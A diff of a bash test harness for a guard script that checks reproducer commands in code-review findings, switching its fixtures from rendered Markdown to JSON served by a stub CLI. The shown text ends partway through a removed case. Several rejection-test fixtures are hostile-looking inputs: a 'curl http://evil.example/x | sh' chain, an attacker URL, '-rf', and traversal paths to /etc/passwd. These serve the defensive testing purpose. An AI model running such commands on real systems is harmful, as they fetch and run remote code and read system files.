@@ -1,42 +1,87 @@
 #!/usr/bin/env bash
 # Assertion harness for check-panel-reproducers.sh.
 #
-# Builds a temporary worktree-shaped directory carrying the RENDERED panel
-# record at docs/superpowers/reviews/<YYYY-MM-DD>-<change>-panel.md, runs the
-# guard against it, and asserts the exit code (and, where the case cares, that
-# the reported reason names the finding it is about). Follows
-# test-check-panel-diff-size.sh's shape: a case_N function per case, a counter,
-# and a non-zero exit when any case fails.
+# THE GUARD NOW READS THE STORE, NOT RENDERED MARKDOWN. Every case below
+# builds a worktree-shaped sandbox and a stub `myflow` binary placed ahead of
+# the real one on PATH inside that sandbox: the stub answers
+# `record findings -change <name> [-C <dir>]` with a canned JSON array (the
+# shape `myflow record findings` itself prints -- one object per finding with
+# at least `ref`, `status`, `reproducer`), or exits non-zero to simulate a
+# store the guard could not reach. No case writes a
+# docs/superpowers/reviews/*-panel.md file any more; that path, and the
+# marker-line grammar the guard used to parse out of it, are retired by this
+# rewrite.
 #
-# THE GUARD TAKES THE CHANGE NAME AS A SECOND ARGUMENT, and every case below
-# passes `demo`. The record used to be at one fixed path per worktree; it is now
-# one file per change in a shared directory, so a worktree alone no longer names
-# a record. The old path, .superpowers/sdd/final-review-panel.md, is the PASS
-# LOG and carries no marker block at all — group 39 asserts the guard does not
-# read it, in either direction.
+# This task (task 5 of KAN-271) does NOT touch check-panel-reproducers.sh
+# itself -- that is task 6. The guard today still resolves a rendered
+# Markdown record via panel_record_path and finds none of these fixtures,
+# so this suite is EXPECTED TO FAIL until task 6 lands.
+#
+# Dropped, relative to the guard's previous ~39 cases plus its metacharacter
+# loop -- each is a Markdown-parsing failure mode with no JSON equivalent, or
+# a scenario the new architecture no longer produces at all:
+#
+#   - "MISSING"/"EXTRA" (old cases 2, 10) and the reversed-block-order case
+#     (old case 19) -- table/marker-agreement checks comparing the
+#     finding-status block's identifiers against the finding-reproducer
+#     block's. A decoded finding is a single JSON object carrying both its
+#     status and its reproducer together; there is no second block whose set
+#     of identifiers could disagree with the first.
+#   - reproducers-total mismatch, absence, duplication, an absurdly long
+#     digit string, and a malformed total beside a well-formed one (old
+#     cases 3, 12, 13, 17, 20, 33) -- checksum-mismatch checks against a
+#     declared count. The JSON array's own length is the count now
+#     (`jq 'length'`), so there is nothing separate left to disagree with it.
+#   - the reused-identifier case (old case 4) -- `findings_ref_key` is a
+#     store uniqueness constraint (see design.md's `store-side-findings`
+#     decision), so two rows sharing a ref cannot reach this guard; the
+#     duplicate-detection code itself is deleted in task 6, not merely
+#     untested here.
+#   - the indented marker line, the identifier with nothing after it, and
+#     the indented duplicate that isolates the same check (old cases 5, 5b,
+#     11) -- Markdown marker-grammar defects. A decoded JSON object has no
+#     "indentation" and no "identifier with nothing after it"; its
+#     reproducer field is simply present, absent, or empty.
+#   - the missing-record-file case (old case 8) -- `record findings` against
+#     a change the store has never heard of now prints `[]` and exits 0
+#     (task 4's ErrNotFound branch), which is exactly case 3 below (zero
+#     findings). The only "cannot answer at all" shape left is the new
+#     store-unreachable case this rewrite adds.
+#   - the directory-shaped record path (old case 14) and the three
+#     panel_record_path/directory-scan cases -- a record only at the old sdd
+#     path, that path raising no violation of its own, and the anchored
+#     match rejecting another change's dated record (old cases 39a, 39b,
+#     39c) -- all exercise panel_record_path's glob-matching over
+#     docs/superpowers/reviews, which task 6 deletes outright along with the
+#     function itself.
+#   - the dash-prefixed relative worktree defeating a grep-as-options
+#     injection into the record path (old case 16) -- that hazard was grep
+#     parsing a path built from WORKTREE as options; once the record comes
+#     from `myflow record findings -C "$WORKTREE"`, no grep ever runs
+#     against a path built from WORKTREE, so the premise is gone.
+#   - the prose-between-markers case (old case 18) -- marker-span; a decoded
+#     JSON array has no notion of two blocks that could be interrupted.
+#   - the NUL-byte case (old case 31) -- a `jq` decode failure has one
+#     shape, not the six the hand-rolled parser had to distinguish.
+#   - the missing-lib/panel-record.sh case (old case 38) -- task 6 deletes
+#     the guard's `source .../lib/panel-record.sh` line and its readability
+#     check outright, so there is no guard code left to exercise this
+#     scenario against once task 6 lands.
 #
 # `-e` as well as `-u`/`pipefail`, matching sixteen of this repository's
 # eighteen sibling harnesses. Without `-e`, a failed `mktemp` in
-# make_worktree left `$wt` holding the PREVIOUS case's path — the harness
-# kept going, ran that case's assertion against a stale sandbox from a
-# different case, and could still print every case passing. `set +e`/
-# `set -e` bracket the two helpers below, exactly like the sibling
-# harnesses' own pattern, because their whole job is to capture a command
-# that is SUPPOSED to exit non-zero, and `-e` would otherwise abort the
-# suite on the very first such case.
+# make_worktree_json left `$wt` holding the PREVIOUS case's path -- the
+# harness kept going, ran that case's assertion against a stale sandbox from
+# a different case, and could still print every case passing. `set +e`/
+# `set -e` bracket the two helpers below, exactly like the sibling harnesses'
+# own pattern, because their whole job is to capture a command that is
+# SUPPOSED to exit non-zero, and `-e` would otherwise abort the suite on the
+# very first such case.
 set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 GUARD="$SCRIPT_DIR/check-panel-reproducers.sh"
 FAILED=0
-
-# REVIEWS is the directory the panel record is RENDERED into, relative to a
-# worktree, and SDD_PANEL is the pass log the guard must NOT read. Both are
-# written out here rather than read from the guard's own variables, so that a
-# guard which started reading the wrong one fails these cases instead of moving
-# the fixtures with it.
-REVIEWS='docs/superpowers/reviews'
-SDD_PANEL='.superpowers/sdd/final-review-panel.md'
 
 # Every case leaves one sandbox directory behind, removed on exit including
 # on a failed assertion. An indexed array, not a space-separated string:
@@ -51,27 +96,83 @@ cleanup() {
 }
 trap cleanup EXIT
 
-make_worktree() {
-  # $1 = panel record body; prints the worktree path. Fails loudly rather
-  # than returning an empty path: under `set -e` a failed `mktemp` would
-  # already abort the suite, but this function is also called from inside
-  # command substitution (`wt="$(make_worktree ...)"`), and a silent empty
-  # `$wt` there is exactly the stale-path hazard `-e` alone does not fully
-  # rule out on every shell — so the failure is named explicitly rather than
-  # relied on implicitly.
-  local wt
+# findings_json <ref> <status> <reproducer> [<ref> <status> <reproducer> ...]
+# -- builds a compact JSON array of finding objects from ref/status/reproducer
+# triples, via `jq -n --args` rather than hand-quoted string interpolation,
+# so that a reproducer value carrying a quote or a backslash (the
+# metacharacter loop below needs both) is escaped correctly without this
+# harness reimplementing JSON string escaping itself.
+findings_json() {
+  # `--` before the positional arguments, not just `--args` before them: a
+  # reproducer value starting with `-` (case 8's `-rf`) is otherwise parsed
+  # by jq's own option handling rather than treated as a positional string.
+  jq -nc '
+    [$ARGS.positional as $a
+     | range(0; ($a | length) / 3)
+     | {ref: $a[. * 3], status: $a[. * 3 + 1], reproducer: $a[. * 3 + 2]}]
+  ' --args -- "$@"
+}
+
+# make_worktree_json <json-array> -- a worktree-shaped sandbox carrying a
+# stub `myflow` on its own bin/, which prints <json-array> for
+# `record findings` and exits 0 regardless of the flags it was called with.
+# Prints the worktree path.
+make_worktree_json() {
+  local wt json="$1"
   wt="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")" || {
-    printf 'make_worktree: mktemp failed — aborting suite rather than continuing with a stale path\n' >&2
+    printf 'make_worktree_json: mktemp failed -- aborting suite rather than continuing with a stale path\n' >&2
     exit 1
   }
   WORKTREES+=("$wt")
-  # The record goes where the renderer writes it — the dated path under
-  # $REVIEWS, for the change `demo` every case below names. The sdd directory
-  # is created empty beside it because it exists in every real worktree as the
-  # pass log's home; group 39 is what asserts the guard never reads it.
-  mkdir -p "$wt/.superpowers/sdd" "$wt/$REVIEWS"
-  printf '%s\n' "$1" > "$wt/$REVIEWS/2026-01-01-demo-panel.md"
+  mkdir -p "$wt/bin"
+  # The JSON payload is written to its own file rather than interpolated
+  # into the heredoc's shell source: a reproducer value under test may
+  # itself carry a literal single quote (case 17's apostrophe metachar), and
+  # embedding that byte inside a `'$json'`-quoted printf argument would
+  # prematurely close the quote and hand the shell a syntactically invalid
+  # script -- a defect in the stub generator, not in anything under test.
+  printf '%s' "$json" > "$wt/bin/findings.json"
+  cat > "$wt/bin/myflow" <<'STUB'
+#!/usr/bin/env bash
+cat "$(dirname -- "$0")/findings.json"
+exit 0
+STUB
+  chmod +x "$wt/bin/myflow"
   printf '%s' "$wt"
+}
+
+# make_worktree_store_unreachable -- a worktree-shaped sandbox whose stub
+# `myflow` exits non-zero and prints nothing useful to stdout, simulating a
+# store `record findings` could not reach.
+make_worktree_store_unreachable() {
+  local wt
+  wt="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")" || {
+    printf 'make_worktree_store_unreachable: mktemp failed -- aborting suite rather than continuing with a stale path\n' >&2
+    exit 1
+  }
+  WORKTREES+=("$wt")
+  mkdir -p "$wt/bin"
+  cat > "$wt/bin/myflow" <<'STUB'
+#!/usr/bin/env bash
+echo "myflow: connect: connection refused" >&2
+exit 1
+STUB
+  chmod +x "$wt/bin/myflow"
+  printf '%s' "$wt"
+}
+
+# run_with_stub <guard-binary> <worktree> <name> -- runs <guard-binary>
+# against <worktree>/<name>, with <worktree>/bin (the stub myflow's home)
+# placed ahead of the real PATH. The env-prefix form scopes PATH to this one
+# command's execution environment alone, never leaking into the harness's
+# own shell.
+run_with_stub() {
+  local guard="$1" wt="$2" name="$3"
+  PATH="$wt/bin:$PATH" "$guard" "$wt" "$name"
+}
+
+run_guard() {
+  run_with_stub "$GUARD" "$1" "${2:-demo}"
 }
 
 expect_exit() {
@@ -79,8 +180,8 @@ expect_exit() {
   local label="$1" want="$2"; shift 2
   local out got
   # The command under test is EXPECTED to exit non-zero in most cases here,
-  # so it runs under a local `set +e`/`set -e` bracket — matching this
-  # repository's other harnesses — rather than letting the suite's own
+  # so it runs under a local `set +e`/`set -e` bracket -- matching this
+  # repository's other harnesses -- rather than letting the suite's own
   # `set -e` treat that expected non-zero exit as the suite's own failure.
   set +e
   out="$("$@" 2>&1)"; got=$?
@@ -116,491 +217,157 @@ expect_exit_and_names() {
 }
 
 # ===========================================================================
-# 1. Every finding has a well-formed reproducer — exit 0.
+# 1. Every finding has a well-formed reproducer -- exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 2
-finding-status: F1 fixed
-finding-status: F2 fixed
-
-reproducers-total: 2
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit 'case 1: all present exits 0' 0 "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json \
+  F1 fixed 'scripts/test-check-panel-reproducers.sh' \
+  F2 fixed 'none — prose-only, no runnable check')")"
+expect_exit 'case 1: all present exits 0' 0 run_guard "$wt"
 
 # ===========================================================================
-# 2. A finding named in the status block has no reproducer line — exit 1,
-#    naming it with the MISSING wording specifically (not merely the
-#    identifier substring). F20 found that swapping the guard's two `comm`
-#    directions mislabels every finding — a missing reproducer reported with
-#    the EXTRA wording and vice versa — while still passing an assertion
-#    that only checks the identifier appears somewhere in the output. Tying
-#    the identifier to its own message's wording is what a swap would break.
+# 2. none — <reason> is accepted as well-formed -- exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 2
-finding-status: F1 fixed
-finding-status: F2 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 2: missing reproducer for F2 exits 1 and names it' 1 'F2 carry no reproducer' "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json \
+  F1 fixed 'none — prose-only, no runnable check')")"
+expect_exit 'case 2: none — <reason> is well-formed, exits 0' 0 run_guard "$wt"
 
 # ===========================================================================
-# 3. reproducers-total disagrees with the number of anchored reproducer
-#    lines — exit 1.
+# 3. No findings at all -- an empty JSON array -- exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 2
-finding-status: F1 fixed
-finding-status: F2 fixed
-
-reproducers-total: 5
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 3: reproducers-total mismatch exits 1' 1 'reproducers-total' "$GUARD" "$wt" demo
+wt="$(make_worktree_json '[]')"
+expect_exit 'case 3: zero findings exits 0' 0 run_guard "$wt"
 
 # ===========================================================================
-# 4. Two finding-reproducer: lines reuse F1 — exit 1, naming the reused
-#    identifier.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 2
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-finding-reproducer: F1 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 4: reused identifier exits 1 and names F1' 1 'F1' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 5. A finding-reproducer: line is indented, or carries an identifier with
-#    nothing after it — exit 1.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
- finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit 'case 5: indented reproducer line exits 1' 1 "$GUARD" "$wt" demo
-
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1')"
-expect_exit 'case 5b: identifier with nothing after it exits 1' 1 "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 6. none — <reason> is accepted as well-formed — exit 0.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 none — prose-only, no runnable check')"
-expect_exit 'case 6: none — <reason> is well-formed, exits 0' 0 "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 7. A record with findings-total: 0, no status markers, reproducers-total:
-#    0 and no reproducer lines — exit 0.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 0
-
-reproducers-total: 0')"
-expect_exit 'case 7: zero findings exits 0' 0 "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 8. No panel record at the expected path — exit 2.
-# ===========================================================================
-wt8="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-WORKTREES+=("$wt8")
-expect_exit 'case 8: missing record exits 2' 2 "$GUARD" "$wt8" demo
-
-# ===========================================================================
-# 9. The argument is not a directory — exit 2, naming the argument as not a
-#    directory. Asserting the message, not just the exit code, is what
-#    isolates this case from the missing-record case (8), which also exits
-#    2 but for a different reason and with a different message.
+# 4. The worktree argument is not a directory -- exit 2, naming the argument
+#    as not a directory. Unaffected by the store rewrite: this check runs
+#    before the guard ever resolves a stub or a real myflow.
 # ===========================================================================
 not_a_dir="$(mktemp "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-expect_exit_and_names 'case 9: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir" demo
+expect_exit_and_names 'case 4: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir" demo
 rm -f "$not_a_dir"
 
 # ===========================================================================
-# 10. A reproducer line names F9, which the status block does not name —
-#     exit 1, with the EXTRA wording specifically (not merely the identifier
-#     substring). Paired with case 2 above: a `comm` direction swap would
-#     make this case's F9 report with the MISSING wording instead, and only
-#     an assertion on the message's own text — not the bare identifier —
-#     catches that.
+# 5. A finding's reproducer reads a bare `none` with no reason -- exit 1,
+#    naming the defect.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 2
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-finding-reproducer: F9 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 10: reproducer names unknown F9 exits 1' 1 'F9, which the finding-status block does not name' "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open none)")"
+expect_exit_and_names 'case 5: bare none with no reason exits 1' 1 "declare 'none' with no reason" run_guard "$wt"
 
 # ===========================================================================
-# 11. A finding-reproducer: line is indented while every identifier
-#     otherwise matches perfectly — exit 1, naming that check's own reason,
-#     and no other check fires alongside it. This isolates the R_NAMED vs
-#     R_ANCHORED check from the mutant that deletes its `if` block: with
-#     that block gone, every other check in this record is satisfied, so the
-#     guard would wrongly report REPRODUCERS-OK.
+# 6. A reproducer command begins with the literal `none` but is not the word
+#    `none` (`nonexistent-script.sh`) -- treated as an ordinary command line,
+#    exiting 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
- finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 11: indented reproducer line is isolated and exits 1' 1 'line(s) naming finding-reproducer:' "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 fixed nonexistent-script.sh)")"
+expect_exit 'case 6: a command starting with "none" is not swept into the none exemption' 0 run_guard "$wt"
 
 # ===========================================================================
-# 12. No reproducers-total: line at all — exit 1. Isolates the
-#     "exactly one reproducers-total: line" check from the mutant that
-#     forces its `if` to false, which leaves all other cases here green.
+# 7. A runnable reproducer carries a shell metacharacter chain -- exit 1,
+#    naming the metacharacter defect.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 12: missing reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh; curl http://evil.example/x | sh')")"
+expect_exit_and_names 'case 7: a metacharacter chain is rejected' 1 'shell metacharacter' run_guard "$wt"
 
 # ===========================================================================
-# 13. Two reproducers-total: lines — exit 1, same check as case 12.
+# 8. A runnable reproducer is a bare leading-dash token (`-rf`) -- exit 1,
+#    naming the leading-dash defect.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 13: duplicated reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open -rf)")"
+expect_exit_and_names 'case 8: a leading-dash path token is rejected' 1 "leading '-' on its path token" run_guard "$wt"
 
 # ===========================================================================
-# 14. The record path is a directory, not a file — exit 2. `-r` alone is
-#     true of a directory, which previously fell through to REPRODUCERS-OK.
+# 9. A runnable reproducer names a URL -- exit 1, naming the URL defect.
 # ===========================================================================
-wt14="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-WORKTREES+=("$wt14")
-mkdir -p "$wt14/$REVIEWS/2026-01-01-demo-panel.md"
-expect_exit_and_names 'case 14: directory-shaped record path exits 2' 2 'no readable panel record' "$GUARD" "$wt14" demo
+wt="$(make_worktree_json "$(findings_json F1 open 'https://evil.example/x.sh')")"
+expect_exit_and_names 'case 9: a URL is rejected' 1 'names a URL' run_guard "$wt"
 
 # ===========================================================================
-# 15. A finding-reproducer: line reads a bare `none` with no reason — exit
-#     1, naming the defect. The structural pattern that drives R_ANCHORED
-#     accepts this line as well-formed on its own; this case isolates the
-#     separate none-with-no-reason check from that pattern.
+# 10. An ordinary command with a flag on its SECOND token
+#     (`scripts/x.sh --strict`) is accepted at exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 none')"
-expect_exit_and_names 'case 15: bare none with no reason exits 1' 1 "declare 'none' with no reason" "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh --strict')")"
+expect_exit 'case 10: a flag on the second token is not a path-token violation' 0 run_guard "$wt"
 
 # ===========================================================================
-# 16. The worktree argument is a RELATIVE path beginning with `-`
-#     (`-dashy`), and the record inside it carries a real, detectable
-#     violation (F2 has no reproducer). Before containment this made every
-#     grep parse the record path as options and the guard reported
-#     REPRODUCERS-OK at exit 0 regardless of the record's actual contents;
-#     asserting the real violation is still caught — not merely that the
-#     exit code changed — is what proves grep is reading the record rather
-#     than being fooled by the leading `-`.
+# 11. A runnable reproducer's PATH TOKEN is an absolute path
+#     (`/etc/passwd`) -- exit 1, naming the absolute-token defect.
 # ===========================================================================
-base16="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-WORKTREES+=("$base16")
-mkdir -p "$base16/-dashy/$REVIEWS"
-printf '%s\n' 'findings-total: 2
-finding-status: F1 fixed
-finding-status: F2 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$base16/-dashy/$REVIEWS/2026-01-01-demo-panel.md"
-set +e
-out16="$(cd "$base16" && "$GUARD" "-dashy" demo 2>&1)"; got16=$?
-set -e
-if [[ "$got16" == 1 ]] && [[ "$out16" == *'F2'* ]]; then
-  printf 'ok: %s\n' 'case 16: dash-prefixed relative worktree still detects a real violation'
-else
-  printf 'FAIL %s: expected exit 1 naming F2, got exit %s\n%s\n' 'case 16: dash-prefixed relative worktree still detects a real violation' "$got16" "$out16"
-  FAILED=1
-fi
+wt="$(make_worktree_json "$(findings_json F1 open /etc/passwd)")"
+expect_exit_and_names 'case 11: an absolute path token is rejected' 1 'absolute token' run_guard "$wt"
 
 # ===========================================================================
-# 17. reproducers-total carries an absurdly long digit string (26 digits) —
-#     exit 1, rejected as malformed rather than dying inside an integer
-#     comparison and silently reporting REPRODUCERS-OK.
+# 12. A runnable reproducer's ARGUMENT (not its path token) is an absolute
+#     path (`scripts/x.sh /etc/passwd`) -- exit 1.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 99999999999999999999999999
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 17: absurdly long reproducers-total is rejected, not silently passed' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh /etc/passwd')")"
+expect_exit_and_names 'case 12: an absolute argument is rejected' 1 'absolute token' run_guard "$wt"
 
 # ===========================================================================
-# 18. Prose sits between the two finding-reproducer: marker lines — exit 1,
-#     the unbroken-span check firing. Locks in behaviour that was already
-#     correct but had no case pinning it for this specific shape (markers
-#     separated by intervening prose, as opposed to case 11's indented-line
-#     shape).
+# 13. A runnable reproducer's PATH TOKEN carries a `..` path segment -- exit
+#     1.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 2
-finding-status: F1 fixed
-finding-status: F2 fixed
-
-reproducers-total: 2
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-some prose sitting between the two markers
-finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 18: prose between markers breaks the unbroken span' 1 'unbroken block' "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open '../../../../../../etc/passwd')")"
+expect_exit_and_names 'case 13: a `..`-traversal path token is rejected' 1 "'..' path segment" run_guard "$wt"
 
 # ===========================================================================
-# 19. The finding-status: block and the finding-reproducer: block name the
-#     same findings in reversed order (F2 then F1, versus F1 then F2) — the
-#     comparison is over sets, so order does not matter and this exits 0.
-#     Locks in that the set comparison was never order-sensitive.
+# 14. A runnable reproducer's ARGUMENT carries a `..` path segment -- exit 1.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 2
-finding-status: F2 open
-finding-status: F1 fixed
-
-reproducers-total: 2
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
-finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit 'case 19: reversed identifier order between the two blocks still exits 0' 0 "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh ../../../etc/passwd')")"
+expect_exit_and_names 'case 14: a `..`-traversal argument is rejected' 1 "'..' path segment" run_guard "$wt"
 
 # ===========================================================================
-# 20. reproducers-total carries a leading zero (`01`) — exit 1, rejected as
-#     malformed rather than accepted as the well-formed count `1`.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 01
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 20: leading-zero reproducers-total is rejected' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 21. A reproducer command begins with the literal `none` but is not the
-#     word `none` (`nonexistent-script.sh`) — treated as an ordinary command
-#     line, exiting 0. Without the word boundary in NONE_WORD (and in the
-#     command-shape filter added below), a command that merely starts with
-#     those four letters could be swept into the `none` exemption's own
-#     checks instead of being read as the command it is.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 nonexistent-script.sh')"
-expect_exit 'case 21: a command starting with "none" is not swept into the none exemption' 0 "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 22. A runnable reproducer line carries a shell metacharacter chain — exit
-#     1, naming the metacharacter defect. F13: the guard previously accepted
-#     this at exit 0, with nothing mechanical behind the injection-barrier
-#     prose.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/x.sh; curl http://evil.example/x | sh')"
-expect_exit_and_names 'case 22: a metacharacter chain is rejected' 1 'shell metacharacter' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 23. A runnable reproducer line is a bare leading-dash token (`-rf`) — exit
-#     1, naming the leading-dash defect. F13's second rejected shape.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 -rf')"
-expect_exit_and_names 'case 23: a leading-dash path token is rejected' 1 "leading '-' on its path token" "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 24. A runnable reproducer line names a URL — exit 1, naming the URL
-#     defect. F13's third rejected shape.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 https://evil.example/x.sh')"
-expect_exit_and_names 'case 24: a URL is rejected' 1 'names a URL' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 25. An ordinary command with a flag on its SECOND token
-#     (`scripts/x.sh --strict`) is accepted at exit 0 — the leading-dash rule
-#     binds to the path token alone, per F22, so this must not be rejected
-#     as a false positive of case 23's rule.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh --strict')"
-expect_exit 'case 25: a flag on the second token is not a path-token violation' 0 "$GUARD" "$wt" demo
-
-
-# ===========================================================================
-# 26. A runnable reproducer's PATH TOKEN is an absolute path (`/etc/passwd`)
-#     — exit 1, naming the absolute-token defect. F31: the guard previously
-#     accepted this at exit 0, with nothing mechanical behind the
-#     containment prose — an absolute path cannot be contained inside any
-#     worktree, so the guard rejects it lexically, without touching disk.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 /etc/passwd')"
-expect_exit_and_names 'case 26: an absolute path token is rejected' 1 'absolute token' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 27. A runnable reproducer's ARGUMENT (not its path token) is an absolute
-#     path (`scripts/x.sh /etc/passwd`) — exit 1. F31's per-argument half:
-#     containment was checked on the path token alone, leaving an argument
-#     free to name a location outside every worktree.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/x.sh /etc/passwd')"
-expect_exit_and_names 'case 27: an absolute argument is rejected' 1 'absolute token' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 28. A runnable reproducer's PATH TOKEN carries a `..` path segment
-#     (`../../../../../../etc/passwd`) — exit 1. F31's other verified
-#     fixture: the guard previously accepted this at exit 0.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 ../../../../../../etc/passwd')"
-expect_exit_and_names 'case 28: a `..`-traversal path token is rejected' 1 "'..' path segment" "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 29. A runnable reproducer's ARGUMENT carries a `..` path segment
-#     (`scripts/x.sh ../../../etc/passwd`) — exit 1. F31's per-argument half
-#     of the traversal check.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/x.sh ../../../etc/passwd')"
-expect_exit_and_names 'case 29: a `..`-traversal argument is rejected' 1 "'..' path segment" "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 30. A positive control for cases 28-29: a path token containing the two
+# 15. A positive control for cases 13-14: a path token containing the two
 #     characters `..` WITHOUT that being a whole path segment
-#     (`scripts/foo..bar.sh`) is accepted at exit 0. Proves the `..` check is
-#     bound to a path segment, not to the substring, so an ordinary filename
-#     that happens to contain two dots is not swept in as a false positive.
+#     (`scripts/foo..bar.sh`) is accepted at exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/foo..bar.sh')"
-expect_exit 'case 30: two dots inside a filename, not a path segment, is not rejected' 0 "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/foo..bar.sh')")"
+expect_exit 'case 15: two dots inside a filename, not a path segment, is not rejected' 0 run_guard "$wt"
 
 # ===========================================================================
-# 31. A NUL byte sits inside a finding-reproducer: line — exit 1, naming the
